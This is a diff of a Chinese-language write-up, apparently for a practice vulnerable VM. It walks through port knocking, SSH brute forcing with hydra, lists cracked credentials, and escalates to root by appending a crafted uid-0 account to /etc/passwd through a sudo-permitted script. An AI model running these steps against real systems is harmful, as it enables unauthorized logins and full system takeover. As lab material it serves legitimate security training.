@@ -7555,8 +7555,8 @@
 <p><img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590370006663-a2339632-dd06-444e-9bb1-cc58757f6eae-107110.png" /></p>
 <p>一开始 22 端口是关着的</p>
 <p><img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590370379475-c86e5bd3-e697-4979-abf8-57addccc8d4f-899985.png" /></p>
-<p>可以用 knock -v 192.168.149.171 7469 8475 9842 来敲门
-也可以 nmap 依次去扫描这些端口
+<p>可以用 knock -v 192.168.149.171 7469 8475 9842 来敲门<br />
+也可以 nmap 依次去扫描这些端口<br />
 <img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590370467080-e4b11216-aff3-4fd7-b2bc-fb96f7fdf836-067256.png" /></p>
 <p>这时候它的 22 端口已经打开了</p>
 <p><img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590370500724-9bf514c3-ec5f-4d13-b1b1-e2e4c74bd307-016063.png" /></p>
@@ -7577,18 +7577,18 @@ for line in f:
 <p>然后 hydra 爆破一波</p>
 <p>hydra -L user.txt -w 10 -P pass.txt -t 10 -v 192.168.149.171 ssh</p>
 <blockquote>
-<p>-L user.txt        指定爆破账号字典为 user.txt
--w 10              设置最大超时时间10s，默认30s
--P pass.txt       指定密码字典为 pass.txt
--t 10               指定爆破线程为 10 个
--v                   指定显示爆破过程
+<p>-L user.txt        指定爆破账号字典为 user.txt<br />
+-w 10              设置最大超时时间10s，默认30s<br />
+-P pass.txt       指定密码字典为 pass.txt<br />
+-t 10               指定爆破线程为 10 个<br />
+-v                   指定显示爆破过程<br />
 -f                   查找到第一个可以使用的账号和密码的时候停止破解</p>
 </blockquote>
 <p><img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590374109840-89e1af0d-bb7c-4c5f-89df-3e16a35b77ca-990268.png" /></p>
-<p>chandlerb：UrAG0D!
-janitor：Ilovepeepee
+<p>chandlerb：UrAG0D!<br />
+janitor：Ilovepeepee<br />
 joeyt：Passw0rd</p>
-<p>登上以后 janitor：Ilovepeepee 存在隐藏文件
+<p>登上以后 janitor：Ilovepeepee 存在隐藏文件<br />
 把这些密码保存出来再来一遍 hydra 爆破</p>
 <p><img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590374338319-4ea6d42e-2ef6-4433-9c1f-95621e87bf74-599117.png" /></p>
 <p>又多出来一个 login：B4-Tru3-001</p>
@@ -7599,11 +7599,11 @@ joeyt：Passw0rd</p>
 <p>在这个目录的上两层，发现了 test.py</p>
 <p><img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590375033513-687bf6ad-cdb5-476c-8014-75efd70a669b-390057.png" /></p>
 <p>当传入的参数是三个的时候（第一个就是文件本身了）可以把第二个参数给读出来然后写到第三个文件后面，而且他还是有 root 权限的，所以只要能够个 test 传入</p>
-<p>生成 hash
+<p>生成 hash<br />
 openssl passwd -1 -salt yichen 123456</p>
-<p>然后写到 /tmp/passwd
+<p>然后写到 /tmp/passwd<br />
 echo 'yichen:$1$yichen$6nzFZVX5T21iu2AmBgzin/:0:0:yichen:/root:/bin/bash' &gt; /tmp/passwd</p>
-<p>运行 sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
+<p>运行 sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd<br />
 就会把我们写在 /tmp/passwd 的内容写到 /etc/passwd</p>
 <p>这时候只需要 su yichen，输入密码：123456，就拥有了 root 权限</p>
 <p><img alt="image.png" src="../img/XdBM36PCgrLyeQqr/1590376705822-0d87f360-dd37-4149-ad82-18a19c972f11-449272.png" /></p>
